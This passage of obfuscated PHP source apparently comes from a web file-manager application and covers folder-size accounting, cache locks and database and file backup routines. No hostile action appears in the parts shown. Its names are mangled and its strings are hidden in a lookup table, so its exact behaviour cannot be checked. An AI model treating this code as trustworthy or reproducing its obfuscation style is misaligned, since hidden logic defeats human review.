self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$ÂÙËÍú¯[468] . $¤…—µÔ­]); unset(self::$cachePathInfoMore[$¤…—µÔ­]); unset(self::$cachePathInfo[$ÂÙËÍú¯[2123] . $¤…—µÔ­]); unset(self::$cachePathInfo[$ÂÙËÍú¯[2124] . $¤…—µÔ­]); } public function metaSet($­¬„‹­É, $—ˆÛúæ = null, $ˆÃ©ìŠ = null) { $±Ş™Ïã = parent::metaSet($­¬„‹­É, $—ˆÛúæ, $ˆÃ©ìŠ); if ($±Ş™Ïã) { $this->sourceCacheClear($­¬„‹­É); } return $±Ş™Ïã; } public function pathInfoByPath($ıÛƒ€« , $»¢ğÃş) { $¢¢Ú˜öç =& $_SERVER[¤·²È‰º]; $±–„°Ì¬ = !$»¢ğÃş ? array() : explode($¢¢Ú˜öç[8], trim($»¢ğÃş, $¢¢Ú˜öç[8])); $é¥§ñËš = $ıÛƒ€« ; foreach ($±–„°Ì¬ as $¶«€‡Ü) { $Õ¶Ù¾Ü = array($¢¢Ú˜öç[440] => $é¥§ñËš, $¢¢Ú˜öç[42] => $¶«€‡Ü); $È«™…ó = $this->where($Õ¶Ù¾Ü)->select(); if (!$È«™…ó) { return !1; } $È«™…ó = array_sort_by($È«™…ó, $¢¢Ú˜öç[439]); $é¥§ñËš = $È«™…ó[0][$¢¢Ú˜öç[410]]; } return $this->pathInfo($é¥§ñËš, !0); } protected function updateModifyTime($âË¸ßÏ) { $©òë“µ =& $_SERVER[¤·²È‰º]; $–ô£›½× = defined($©òë“µ[483]) ? USER_ID : $©òë“µ[207]; if (!$âË¸ßÏ) { return; } if (!is_array($âË¸ßÏ)) { $âË¸ßÏ = array($âË¸ßÏ); } foreach ($âË¸ßÏ as $ÄŒ˜”š® => $Ìé»•üÜ) { $âË¸ßÏ[$ÄŒ˜”š®] = intval($Ìé»•üÜ); $this->sourceCacheClear($Ìé»•üÜ); } $«¼ÉÑ½ = array($©òë“µ[410] => array($©òë“µ[7], $âË¸ßÏ)); $Û¦ÂÛç® = array($©òë“µ[597] => $–ô£›½×, $©òë“µ[432] => time()); $this->where($«¼ÉÑ½)->save($Û¦ÂÛç®); } public function folderSizeReset($şÔ¤ß±ë, $´Ş­³ª = false) { $¾·’Ë’ =& $_SERVER[¤·²È‰º]; if ($this->statusIgnoreResetSpace) { return; } $ĞàëøƒÒ = $this->sourceInfo($şÔ¤ß±ë); $‘½Îñ´Æ = $¾·’Ë’[2125] . $şÔ¤ß±ë; CacheLock::lock($‘½Îñ´Æ, 20); if ($´Ş­³ª === !1) { $this->sourceCacheClear($şÔ¤ß±ë); $ĞàëøƒÒ = $this->sourceInfo($şÔ¤ß±ë); $İ†©‹äê = array($¾·’Ë’[409] => $şÔ¤ß±ë, $¾·’Ë’[438] => 0); $¥“×´ƒÄ = $this->where($İ†©‹äê)->sum($¾·’Ë’[86]); $´Ş­³ª = intval($¥“×´ƒÄ) - intval($ĞàëøƒÒ[$¾·’Ë’[86]]); } if ($´Ş­³ª == 0) { return CacheLock::unlock($‘½Îñ´Æ); } $İ¹‰Ùâ„ = $this->parentLevelArray($ĞàëøƒÒ[$¾·’Ë’[529]]); if (!$İ¹‰Ùâ„) { $İ¹‰Ùâ„ = array(); } $İ¹‰Ùâ„[] = $ĞàëøƒÒ[$¾·’Ë’[410]]; $İ†©‹äê = array($¾·’Ë’[410] => array($¾·’Ë’[426], $İ¹‰Ùâ„)); if ($´Ş­³ª < 0) { $İ†©‹äê[$¾·’Ë’[86]] = array($¾·’Ë’[1009], abs($´Ş­³ª)); } $this->where($İ†©‹äê)->setAdd($¾·’Ë’[86], $´Ş­³ª); CacheLock::unlock($‘½Îñ´Æ); $Œ®ƒ³½™ = $¾·’Ë’[2126] . $ĞàëøƒÒ[$¾·’Ë’[419]] . $¾·’Ë’[4] . $ĞàëøƒÒ[$¾·’Ë’[513]]; $èÎéÕï = array($ĞàëøƒÒ[$¾·’Ë’[419]], $ĞàëøƒÒ[$¾·’Ë’[513]]); TaskRun::timeLimitCall($Œ®ƒ³½™, $¾·’Ë’[2127], $èÎéÕï, 1.5); } public function folderSizeResetChildren($¬Ç€ñÍ²) { $È´Ëß ” =& $_SERVER[¤·²È‰º]; $this->sourceCacheClear($¬Ç€ñÍ²); $èş«„´Ì = $this->sourceInfo($¬Ç€ñÍ²); $Ã¡çÇ…™ = array($È´Ëß ”[591] => 1, $È´Ëß ”[595] => $èş«„´Ì[$È´Ëß ”[513]], $È´Ëß ”[598] => array($È´Ëß ”[558], $èş«„´Ì[$È´Ëß ”[529]] . $¬Ç€ñÍ² . $È´Ëß ”[559])); $¶•†‡× = $È´Ëß ”[2128]; $ı‡İÚ˜ı = $this->field($¶•†‡×)->where($Ã¡çÇ…™)->select(); $Ã¡çÇ…™[$È´Ëß ”[418]] = 0; $şã”¹Ÿ = $this->field($¶•†‡×)->where($Ã¡çÇ…™)->select(); if (!$şã”¹Ÿ) { return; } $ı‡İÚ˜ı[] = $èş«„´Ì; $ı‡İÚ˜ı = array_to_keyvalue($ı‡İÚ˜ı, $È´Ëß ”[410]); foreach ($ı‡İÚ˜ı as $ƒ˜œÉ¤ => $Ûˆ‰ª£) { $ı‡İÚ˜ı[$ƒ˜œÉ¤][$È´Ëß ”[2129]] = $ı‡İÚ˜ı[$ƒ˜œÉ¤][$È´Ëß ”[86]]; $ı‡İÚ˜ı[$ƒ˜œÉ¤][$È´Ëß ”[86]] = 0; } foreach ($şã”¹Ÿ as $Ûˆ‰ª£) { $¦èäğ¼ = $Ûˆ‰ª£[$È´Ëß ”[440]] . $È´Ëß ”[12]; if (!isset($ı‡İÚ˜ı[$¦èäğ¼])) { continue; } if ($Ûˆ‰ª£[$È´Ëß ”[439]] == $ı‡İÚ˜ı[$¦èäğ¼][$È´Ëß ”[439]]) { $ı‡İÚ˜ı[$¦èäğ¼][$È´Ëß ”[86]] += $Ûˆ‰ª£[$È´Ëß ”[86]]; } } foreach ($ı‡İÚ˜ı as $Ûˆ‰ª£) { $¢ú·‹ÆÄ = $this->parentLevelArray($Ûˆ‰ª£[$È´Ëß ”[529]]); foreach ($¢ú·‹ÆÄ as $¦èäğ¼) { $¦èäğ¼ = $¦èäğ¼ . $È´Ëß ”[12]; if (!isset($ı‡İÚ˜ı[$¦èäğ¼])) { continue; } if ($Ûˆ‰ª£[$È´Ëß ”[439]] == $ı‡İÚ˜ı[$¦èäğ¼][$È´Ëß ”[439]]) { $ı‡İÚ˜ı[$¦èäğ¼][$È´Ëß ”[86]] += $Ûˆ‰ª£[$È´Ëß ”[86]]; } } } $åùæÆ´ = array(); foreach ($ı‡İÚ˜ı as $Ûˆ‰ª£) { if ($Ûˆ‰ª£[$È´Ëß ”[86]] == $Ûˆ‰ª£[$È´Ëß ”[2129]]) { continue; } $åùæÆ´[] = array($È´Ëß ”[410], $Ûˆ‰ª£[$È´Ëß ”[410]], $È´Ëß ”[86], $Ûˆ‰ª£[$È´Ëß ”[86]]); } $this->saveAll($åùæÆ´); } public function userSpaceReset($œÌÆêï = false) { $ë’ìÄß =& $_SERVER[¤·²È‰º]; $µËÒÎŸ‡ = $this->where(array($ë’ìÄß[419] => self::TYPE_USER, $ë’ìÄß[513] => $œÌÆêï, $ë’ìÄß[418] => 0))->sum($ë’ìÄß[86]); $µËÒÎŸ‡ = !$µËÒÎŸ‡ || $µËÒÎŸ‡ <= 0 ? 0 : $µËÒÎŸ‡; Model($ë’ìÄß[521])->userEdit($œÌÆêï, array($ë’ìÄß[1812] => $µËÒÎŸ‡)); } public function targetSpaceUpdate($Æ×ØÖë, $ÏÛ¿‰«) { $•Ãı†²¨ =& $_SERVER[¤·²È‰º]; if (!$ÏÛ¿‰«) { return; } if (!in_array($Æ×ØÖë, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $äÙÆÓ = $this->targetSpaceSize($Æ×ØÖë, $ÏÛ¿‰«); if ($Æ×ØÖë == self::TYPE_USER) { Model($•Ãı†²¨[521])->userEdit($ÏÛ¿‰«, array($•Ãı†²¨[1812] => $äÙÆÓ)); } else { if ($Æ×ØÖë == self::TYPE_GROUP) { Model($•Ãı†²¨[530])->groupEdit($ÏÛ¿‰«, array($•Ãı†²¨[1812] => $äÙÆÓ)); } } } public function targetSpaceSize($©¹µı°×, $–Æ©­Ö‚) { $ªÏÆá“À =& $_SERVER[¤·²È‰º]; $¸»ÏÓÂ = 0; $¬ĞùÛŒš = $this->sourceRoot($©¹µı°×, $–Æ©­Ö‚, !0); foreach ($¬ĞùÛŒš as $ã§ÚìÈª) { if (!$ã§ÚìÈª) { continue; } $¸»ÏÓÂ += floatval($ã§ÚìÈª[$ªÏÆá“À[86]]); $‘À„ñ»Ø = array($ªÏÆá“À[598] => array($ªÏÆá“À[558], $ªÏÆá“À[539] . $ã§ÚìÈª[$ªÏÆá“À[410]] . $ªÏÆá“À[559])); $Íİïû›Ø = Model($ªÏÆá“À[437])->field($ªÏÆá“À[425])->where($‘À„ñ»Ø)->select(); $Íİïû›Ø = array_to_keyvalue($Íİïû›Ø, $ªÏÆá“À[12], $ªÏÆá“À[410]); $Íİïû›Ø = array_unique(array_filter($Íİïû›Ø)); if ($Íİïû›Ø) { $‘À„ñ»Ø = array($ªÏÆá“À[425] => array($ªÏÆá“À[426], $Íİïû›Ø)); $¸»ÏÓÂ += floatval($this->where($‘À„ñ»Ø)->sum($ªÏÆá“À[86])); } } $¸»ÏÓÂ = !$¸»ÏÓÂ || $¸»ÏÓÂ <= 0 ? 0 : $¸»ÏÓÂ; return $¸»ÏÓÂ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($®ßßèĞİ) { return $this->fileTypeProfile($®ßßèĞİ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($õÊÂ›¸…) { return $this->fileTypeProfile($õÊÂ›¸…, SourceModel::TYPE_GROUP); } private function fileTypeProfile($ëµÀ×î, $ÁÍÁèó—) { $Æ›˜¤ =& $_SERVER[¤·²È‰º]; $ùŸóãîô = $Æ›˜¤[2130] . $ëµÀ×î . $Æ›˜¤[11] . $ÁÍÁèó—; $èëÌ‚û» = Cache::get($ùŸóãîô); if ($èëÌ‚û») { return $èëÌ‚û»; } $ùÔ›³ı = array($Æ›˜¤[591] => 0); if ($ëµÀ×î != !1) { $ùÔ›³ı[$Æ›˜¤[513]] = $ëµÀ×î; $ùÔ›³ı[$Æ›˜¤[419]] = $ÁÍÁèó—; } $ÙËÍš¸– = array(); $ÙËÍš¸–[$Æ›˜¤[2131]] = array($Æ›˜¤[2132] => LNG($Æ›˜¤[2131]), $Æ›˜¤[2133] => $this->where($ùÔ›³ı)->count(), $Æ›˜¤[593] => $this->where($ùÔ›³ı)->sum($Æ›˜¤[86])); $×„÷æ¡ó = KodIO::fileTypeList(); foreach ($×„÷æ¡ó as $°’şœ€Î => $Æ›ËÇ»³) { $ùÔ›³ı[$Æ›˜¤[420]] = $this->fileTypeWhere($°’şœ€Î); $ÙËÍš¸–[$°’şœ€Î] = array($Æ›˜¤[2132] => $Æ›ËÇ»³[$Æ›˜¤[42]], $Æ›˜¤[2133] => $this->where($ùÔ›³ı)->count(), $Æ›˜¤[593] => $this->where($ùÔ›³ı)->sum($Æ›˜¤[86])); } Cache::set($ùŸóãîô, $ÙËÍš¸–, 1200); return $ÙËÍš¸–; } public function fileNameExist($ÔÉü‘Óş, $é„™û¾ë) { $£è««ú‘ =& $_SERVER[¤·²È‰º]; $‚Ìœï‘ = $this->where(array($£è««ú‘[440] => $ÔÉü‘Óş, $£è««ú‘[42] => $é„™û¾ë, $£è««ú‘[439] => 0))->find(); return is_array($‚Ìœï‘) ? $‚Ìœï‘[$£è««ú‘[410]] : !1; } public function childList($É•¸íá§) { $ìÒÈ°†â =& $_SERVER[¤·²È‰º]; $âº¨®Îö = $ìÒÈ°†â[2105] . $É•¸íá§; if (isset(self::$cacheChildList[$âº¨®Îö])) { return self::$cacheChildList[$âº¨®Îö]; } $€‚Ñš·ñ = array($ìÒÈ°†â[440] => intval($É•¸íá§), $ìÒÈ°†â[439] => 0); $ÒâÖÀ…á = $this->where($€‚Ñš·ñ)->select(); $ÒâÖÀ…á = $ÒâÖÀ…á ? $ÒâÖÀ…á : array(); self::$cacheChildList[$âº¨®Îö] = $ÒâÖÀ…á; foreach ($ÒâÖÀ…á as $÷·‡©€) { $âº¨®Îö = $ìÒÈ°†â[468] . $÷·‡©€[$ìÒÈ°†â[410]]; self::$cacheSourceInfo[$âº¨®Îö] = $÷·‡©€; } return $ÒâÖÀ…á; } public function fileNameAuto($‹¯Çß¶Ò, $¼şçûòî, $„Ù ©®µ = REPEAT_RENAME, $à‚ˆ‘×á = false) { $ä¥æšôÓ =& $_SERVER[¤·²È‰º]; $€ó÷ä“ã = get_path_ext($¼şçûòî); $‡‹ˆùÔ = $€ó÷ä“ã ? basename($¼şçûòî, $ä¥æšôÓ[10] . $€ó÷ä“ã) . $ä¥æšôÓ[2134] . $€ó÷ä“ã : $¼şçûòî . $ä¥æšôÓ[392]; $–•Äîû = array($ä¥æšôÓ[440] => $‹¯Çß¶Ò, $ä¥æšôÓ[439] => 0, $ä¥æšôÓ[42] => array($ä¥æšôÓ[391], $‡‹ˆùÔ)); $Íş´† = $this->field($ä¥æšôÓ[42])->where($–•Äîû)->select(); $®¸Î¦ ª = array_to_keyvalue($Íş´†, $ä¥æšôÓ[12], $ä¥æšôÓ[42]); return $this->fileNameAutoGet($®¸Î¦ ª, $¼şçûòî, $„Ù ©®µ, $à‚ˆ‘×á); } public function fileNameAutoGet($ÖÚŞ¢Î©, $ÁœÒ×Àú, $ÖŸÛ¨‚Œ, $¡•êŒÁğ) { $Æ…úŠ° =& $_SERVER[¤·²È‰º]; if ($ÖŸÛ¨‚Œ == REPEAT_REPLACE || !$ÖÚŞ¢Î© || !in_array_not_case($ÁœÒ×Àú, $ÖÚŞ¢Î©) || $¡•êŒÁğ && $ÖŸÛ¨‚Œ != REPEAT_RENAME_FOLDER) { return $ÁœÒ×Àú; } if ($ÖŸÛ¨‚Œ == REPEAT_SKIP) { return !1; } $ÕÊÔ›ã“ = $Æ…úŠ°[10] . get_path_ext($ÁœÒ×Àú); $ÕÊÔ›ã“ = $ÕÊÔ›ã“ == $Æ…úŠ°[10] || $¡•êŒÁğ ? $Æ…úŠ°[12] : $ÕÊÔ›ã“; for ($ú©ø´¶ş = 1; $ú©ø´¶ş <= count($ÖÚŞ¢Î©) + 1; $ú©ø´¶ş++) { $¨“İĞú¡ = substr($ÁœÒ×Àú, 0, strlen($ÁœÒ×Àú) - strlen($ÕÊÔ›ã“)); $¿ş«úİ¢ = $¨“İĞú¡ . "\x28{$ú©ø´¶ş}\x29{$ÕÊÔ›ã“}"; if (!in_array_not_case($¿ş«úİ¢, $ÖÚŞ¢Î©)) { return $¿ş«úİ¢; } } } } goto fï’‰×œ‘; EÏçµ„ÜÏñ: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Ÿ¼ÀÚÀá =& $_SERVER[¤·²È‰º]; $šÚ…åµ˜ = $GLOBALS[$Ÿ¼ÀÚÀá[6]][$Ÿ¼ÀÚÀá[358]]; self::$cachePath = $šÚ…åµ˜[$Ÿ¼ÀÚÀá[209]][$Ÿ¼ÀÚÀá[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ü®¸““Ë, $¹¼¶‹É¸ = 0) { $ÅœæÃÄ« =& $_SERVER[¤·²È‰º]; $š·öİ¨• = microtime(!0); $·éÉç×ª = $š·öİ¨• + $¹¼¶‹É¸ + 0.0001; $Ñ›õ…èÅ = rtrim(self::$cachePath, $ÅœæÃÄ«[8]) . $ÅœæÃÄ«[860] . md5($Ü®¸““Ë) . $ÅœæÃÄ«[857]; if (file_exists($Ñ›õ…èÅ) && filemtime($Ñ›õ…èÅ) && filemtime($Ñ›õ…èÅ) < time() - 10) { @unlink($Ñ›õ…èÅ); } do { if (file_exists($Ñ›õ…èÅ)) { cacheLockWait(); continue; } $ÜÙİÀÖÑ = fopen($Ñ›õ…èÅ, $ÅœæÃÄ«[861]); if (!$ÜÙİÀÖÑ) { return !1; } $›ŸÑÌ¦é = flock($ÜÙİÀÖÑ, LOCK_EX | LOCK_NB); self::$caches[$Ü®¸““Ë] = array($ÅœæÃÄ«[862] => $ÜÙİÀÖÑ, $ÅœæÃÄ«[209] => $Ñ›õ…èÅ); fwrite($ÜÙİÀÖÑ, $·éÉç×ª); clearstatcache(); if ($ÜÙİÀÖÑ && $›ŸÑÌ¦é) { return !0; } cacheLockWait(); } while (microtime(!0) < $·éÉç×ª); $this->unlock($Ü®¸““Ë); return !1; } public function lockGet($ÔÑ´ÉŒí) { $ó‚ğÛ³‹ =& $_SERVER[¤·²È‰º]; $¶Š¯Šş = rtrim(self::$cachePath, $ó‚ğÛ³‹[8]) . $ó‚ğÛ³‹[860] . md5($ÔÑ´ÉŒí) . $ó‚ğÛ³‹[857]; return file_exists($¶Š¯Šş); } public function unlock($ùµ°¡»Æ) { $¤¸úÄ×€ =& $_SERVER[¤·²È‰º]; $ôğ­ÌñË = self::$caches[$ùµ°¡»Æ]; if (!$ôğ­ÌñË) { return; } @flock($ôğ­ÌñË[$¤¸úÄ×€[862]], LOCK_UN); @fclose($ôğ­ÌñË[$¤¸úÄ×€[862]]); @unlink($ôğ­ÌñË[$¤¸úÄ×€[209]]); unset(self::$caches[$ùµ°¡»Æ]); } } class CacheLockRedis { public function lock($ˆ×ïÄÔ…, $í¤Õ·ÅÃ = 10) { $ÑÊÆ¬ÍŸ = Cache::init(); $è¨¸àˆÆ = microtime(!0) + $í¤Õ·ÅÃ; while (microtime(!0) < $è¨¸àˆÆ) { $‚×§Ç“š = $ÑÊÆ¬ÍŸ->get($ˆ×ïÄÔ…); if (!$‚×§Ç“š) { $¯»ôÕû = $ÑÊÆ¬ÍŸ->setLock($ˆ×ïÄÔ…, $è¨¸àˆÆ, $í¤Õ·ÅÃ); if ($¯»ôÕû) { return !0; } } else { if ($‚×§Ç“š < microtime(!0)) { $ÑÊÆ¬ÍŸ->set($ˆ×ïÄÔ…, $è¨¸àˆÆ, $í¤Õ·ÅÃ * 2); if ($ÑÊÆ¬ÍŸ->get($ˆ×ïÄÔ…) === $‚×§Ç“š) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ò¬¼ø®×) { return Cache::init()->get($Ò¬¼ø®×); } public function unlock($ †ƒÒƒÏ) { return Cache::init()->remove($ †ƒÒƒÏ); } } goto cµ‹ÈÎ«í˜; C’Ç»´Å¼Ï: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $†­çèî’ =& $_SERVER[¤·²È‰º]; $ğÍÔæË = Backup::get(); self::$io = $ğÍÔæË[$†­çèî’[753]]; self::$name = $ğÍÔæË[$†­çèî’[42]]; $ÙÀ·Ÿ„ª = new DbManage(); $Õâ÷Ê©Î = $ÙÀ·Ÿ„ª->dbType(); $šíµÀ¬¤ = array($†­çèî’[777] => $Õâ÷Ê©Î, $†­çèî’[778] => time()); Backup::set($šíµÀ¬¤); $åÎúŸ™º = $this->tmpFilesPath() . $†­çèî’[779] . self::$name . $†­çèî’[8]; del_dir($åÎúŸ™º); mk_dir($åÎúŸ™º); $áÎ£æŠ¼ = $È‚òâ‘ = 0; $©¢îß˜ = new Task($†­çèî’[780], $†­çèî’[781], 0, LNG($†­çèî’[782]) . $†­çèî’[783] . LNG($†­çèî’[784])); try { $Ğ¥†©¨ª = $ÙÀ·Ÿ„ª->db()->getTables(); } catch (Exception $ûÌÈ¹ä°) { $©¢îß˜->end(); return !1; } $Ğ¥†©¨ª = array_diff($Ğ¥†©¨ª, array($†­çèî’[785], $†­çèî’[786])); foreach ($Ğ¥†©¨ª as $ƒÍâÛŠ) { $áÎ£æŠ¼ += $ÙÀ·Ÿ„ª->model($ƒÍâÛŠ)->count(); } $©¢îß˜->task[$†­çèî’[787]] = $áÎ£æŠ¼; $GLOBALS[$†­çèî’[788]] = self::$name; foreach ($Ğ¥†©¨ª as $ƒÍâÛŠ) { $ïüµ›ç» = $åÎúŸ™º . $ƒÍâÛŠ . $†­çèî’[789]; $Ü•íÈ©° = null; if ($ƒÍâÛŠ == $†­çèî’[790] && (!isset($ğÍÔæË[$†­çèî’[756]]) || $ğÍÔæË[$†­çèî’[756]] == $†­çèî’[207])) { $Ü•íÈ©° = self::$io; } $È‚òâ‘ += $ÙÀ·Ÿ„ª->sqlFromDb($ƒÍâÛŠ, $ïüµ›ç», $©¢îß˜, $Ü•íÈ©°); } unset($GLOBALS[$†­çèî’[788]]); $©¢îß˜->end(); if ($È‚òâ‘ > $áÎ£æŠ¼) { $áÎ£æŠ¼ = $È‚òâ‘; } $šíµÀ¬¤ = array($†­çèî’[777] => $Õâ÷Ê©Î, $†­çèî’[774] => 1, $†­çèî’[791] => $áÎ£æŠ¼, $†­çèî’[792] => $È‚òâ‘, $†­çèî’[793] => time()); Backup::set($šíµÀ¬¤); if ($áÎ£æŠ¼ - $È‚òâ‘ > 0) { $Ÿâ€¹²Ç = $†­çèî’[794]; if (stristr(I18n::getType(), $†­çèî’[795])) { $Ÿâ€¹²Ç = $†­çèî’[796]; } write_log(array($Ÿâ€¹²Ç, $šíµÀ¬¤), $†­çèî’[781]); return !1; } return !0; } private function tmpFilesPath() { $¶ÎÜŸÄê =& $_SERVER[¤·²È‰º]; $™Ú‘°”Ÿ = TEMP_FILES; if ($GLOBALS[$¶ÎÜŸÄê[6]][$¶ÎÜŸÄê[99]][$¶ÎÜŸÄê[797]]) { $™Ú‘°”Ÿ = $GLOBALS[$¶ÎÜŸÄê[6]][$¶ÎÜŸÄê[99]][$¶ÎÜŸÄê[797]]; if (!mk_dir($™Ú‘°”Ÿ) || !is_writable($™Ú‘°”Ÿ) || !IO::mkfile($™Ú‘°”Ÿ . $¶ÎÜŸÄê[798])) { $™Ú‘°”Ÿ = TEMP_FILES; } } return $™Ú‘°”Ÿ; } } class BackupDbFile { public function __construct() { } public function index() { $Ê¨¤ïÂ˜ =& $_SERVER[¤·²È‰º]; $íõ‡çúı = Backup::get(); $ä¢åß¬¾ = $íõ‡çúı[$Ê¨¤ïÂ˜[42]]; $¾…”¨‹“ = $this->tmpFilesPath() . "\142\141\x63\153\165\160\x5f{$ä¢åß¬¾}\57"; $Ö’¦Ğ¶ğ = $this->backupPath($íõ‡çúı); if (!($Ö’¦Ğ¶ğ = IO::mkdir($Ö’¦Ğ¶ğ))) { return !1; } $Â¯¿£¶ = IO::listPath($¾…”¨‹“); $¯½à­ÆÃ = isset($Â¯¿£¶[$Ê¨¤ïÂ˜[93]]) ? $Â¯¿£¶[$Ê¨¤ïÂ˜[93]] : array(); $Êœ˜Ø¢™ = array_sum(array_column($¯½à­ÆÃ, $Ê¨¤ïÂ˜[86])); if (!$Êœ˜Ø¢™) { return !1; } $âî¥É—ˆ = array($Ê¨¤ïÂ˜[799] => $Êœ˜Ø¢™, $Ê¨¤ïÂ˜[800] => time()); Backup::set($âî¥É—ˆ); $‡ü£»Ç  = new TaskFileTransfer($Ê¨¤ïÂ˜[801], $Ê¨¤ïÂ˜[781], count($¯½à­ÆÃ), LNG($Ê¨¤ïÂ˜[782]) . $Ê¨¤ïÂ˜[394] . LNG($Ê¨¤ïÂ˜[784]) . $Ê¨¤ïÂ˜[802]); $‡ü£»Ç ->task[$Ê¨¤ïÂ˜[764]] = $Êœ˜Ø¢™; foreach ($Â¯¿£¶[$Ê¨¤ïÂ˜[93]] as $ö­¬“”ö) { $ø¬ÍÌÚ = IO::move($ö­¬“”ö[$Ê¨¤ïÂ˜[94]], $Ö’¦Ğ¶ğ); if (!$ø¬ÍÌÚ) { $‡ü£»Ç ->end(); $åˆÕ¾Ù– = IO::getLastError($Ê¨¤ïÂ˜[803] . $ö­¬“”ö[$Ê¨¤ïÂ˜[94]] . $Ê¨¤ïÂ˜[804] . $Ö’¦Ğ¶ğ . $Ê¨¤ïÂ˜[174]); write_log($åˆÕ¾Ù–, $Ê¨¤ïÂ˜[781]); return !1; } } $õã¼¶ŞŞ = new DbManage(); $ÎâÆ½ = $õã¼¶ŞŞ->getSqlFile(); if (!$ÎâÆ½[$Ê¨¤ïÂ˜[805]] || !$ÎâÆ½[$Ê¨¤ïÂ˜[23]]) { return !1; } IO::move($ÎâÆ½[$Ê¨¤ïÂ˜[805]], $Ö’¦Ğ¶ğ); IO::move($ÎâÆ½[$Ê¨¤ïÂ˜[23]], $Ö’¦Ğ¶ğ); $‡ü£»Ç ->end(); $âî¥É—ˆ = array($Ê¨¤ïÂ˜[806] => $Êœ˜Ø¢™, $Ê¨¤ïÂ˜[807] => time()); Backup::set($âî¥É—ˆ); return !0; } private function backupPath($ô‡áÀÇè) { $——ÜÃ¨è =& $_SERVER[¤·²È‰º]; $øÁÁ‚‰ = $ô‡áÀÇè[$——ÜÃ¨è[42]]; $‹ áş®… = Model($——ÜÃ¨è[771])->get($——ÜÃ¨è[772]); $·êÁŒ¾„ = substr(md5($——ÜÃ¨è[773] . $‹ áş®… . $øÁÁ‚‰), 0, 8); return "\x7b\x69\x6f\x3a{$ô‡áÀÇè[$——ÜÃ¨è[753]]}\x7d\57\144\141\164\x61\142\x61\x73\x65\57\x62\x61\143\153\x75\160\x2f" . $øÁÁ‚‰ . $——ÜÃ¨è[11] . $·êÁŒ¾„; } private function tmpFilesPath() { $ü¤ñÕ¬û =& $_SERVER[¤·²È‰º]; $øÓÓ¾¯ó = TEMP_FILES; if ($GLOBALS[$ü¤ñÕ¬û[6]][$ü¤ñÕ¬û[99]][$ü¤ñÕ¬û[797]]) { $øÓÓ¾¯ó = $GLOBALS[$ü¤ñÕ¬û[6]][$ü¤ñÕ¬û[99]][$ü¤ñÕ¬û[797]]; if (!mk_dir($øÓÓ¾¯ó) || !is_writable($øÓÓ¾¯ó) || !IO::mkfile($øÓÓ¾¯ó . $ü¤ñÕ¬û[798])) { $øÓÓ¾¯ó = TEMP_FILES; } } return $øÓÓ¾¯ó; } } class BackupFile { public function __construct() { } public function index() { $£Œİ· ‡ = Backup::get(); $Ó¶Ö ÎÅ = $£Œİ· ‡[$_SERVER[¤·²È‰º][302]][$_SERVER[¤·²È‰º][209]][$_SERVER[¤·²È‰º][476]]; $â‰ó¢Ë– = array($_SERVER[¤·²È‰º][477] => array($_SERVER[¤·²È‰º][808], $Ó¶Ö ÎÅ), $_SERVER[¤·²È‰º][809] => array($_SERVER[¤·²È‰º][340], $£Œİ· ‡[$_SERVER[¤·²È‰º][753]])); $Öš™ŒÃ = (int) Model($_SERVER[¤·²È‰º][790])->where($â‰ó¢Ë–)->count($_SERVER[¤·²È‰º][476]); $¬­¤ğ³‚ = (int) Model($_SERVER[¤·²È‰º][790])->where($â‰ó¢Ë–)->sum($_SERVER[¤·²È‰º][86]); $êœª‹‹á = new TaskFileTransfer($_SERVER[¤·²È‰º][810], $_SERVER[¤·²È‰º][781], $Öš™ŒÃ, LNG($_SERVER[¤·²È‰º][782]) . $_SERVER[¤·²È‰º][783] . LNG($_SERVER[¤·²È‰º][811])); $êœª‹‹á->task[$_SERVER[¤·²È‰º][764]] = $¬­¤ğ³‚; $õ•éîä— = array($_SERVER[¤·²È‰º][812] => $Öš™ŒÃ, $_SERVER[¤·²È‰º][813] => $¬­¤ğ³‚, $_SERVER[¤·²È‰º][814] => time()); Backup::set($õ•éîä—); $ÚûìÍóÛ = !0; $ƒæ¦ «§ = $this->storeIds(); $ô°Ó¥¾ = 1; $ï–‰œ¢€ = 1000; $à°†Ş = $õ©»üŒè = 0; $ÃÈİ¶Øª = array(); $ïñõ½¡” = $ûŒ¨“ÔÈ = 0; do { $ÊÇÅ¥¡¬ = $_SERVER[¤·²È‰º][815]; $ê«“Œ­˜ = Model($_SERVER[¤·²È‰º][790])->where($â‰ó¢Ë–)->field($ÊÇÅ¥¡¬)->order($_SERVER[¤·²È‰º][816])->selectPage($ï–‰œ¢€, $ô°Ó¥¾); $Ğä¶œ = !empty($ê«“Œ­˜[$_SERVER[¤·²È‰º][378]]) ? $ê«“Œ­˜[$_SERVER[¤·²È‰º][378]] : array(); foreach ($Ğä¶œ as $µìÚ¢üË) { if (!$this->_fileExist($µìÚ¢üË, $ÃÈİ¶Øª, $ƒæ¦ «§)) { $Öš™ŒÃ -= 1; $¬­¤ğ³‚ -= (int) $µìÚ¢üË[$_SERVER[¤·²È‰º][86]]; write_log("\146\151\x6c\145\x20\156\157\x74\x20\145\170\151\163\164\56\x66\151\154\145\x49\104\72{$µìÚ¢üË[$_SERVER[¤·²È‰º][476]]}\x2c\40\160\x61\x74\150\x3a{$µìÚ¢üË[$_SERVER[¤·²È‰º][94]]}", $_SERVER[¤·²È‰º][817]); continue; } $‚‡¹Ê¾ = $µìÚ¢üË[$_SERVER[¤·²È‰º][94]]; $ó¯Ö¡æÁ = "\x7b\x69\157\72{$£Œİ· ‡[$_SERVER[¤·²È‰º][753]]}\175" . substr($‚‡¹Ê¾, strlen("\x7b\x69\x6f\x3a{$µìÚ¢üË[$_SERVER[¤·²È‰º][818]]}\175")); if (IO::exist($ó¯Ö¡æÁ)) { $êœª‹‹á->updateFileEnd($µìÚ¢üË[$_SERVER[¤·²È‰º][42]], $µìÚ¢üË[$_SERVER[¤·²È‰º][86]]); } else { $ó¯Ö¡æÁ = get_path_father($ó¯Ö¡æÁ); IO::mkdir($ó¯Ö¡æÁ); if (!IO::copy($‚‡¹Ê¾, $ó¯Ö¡æÁ, $_SERVER[¤·²È‰º][819])) { write_log($_SERVER[¤·²È‰º][820] . $‚‡¹Ê¾ . $_SERVER[¤·²È‰º][804] . $ó¯Ö¡æÁ . 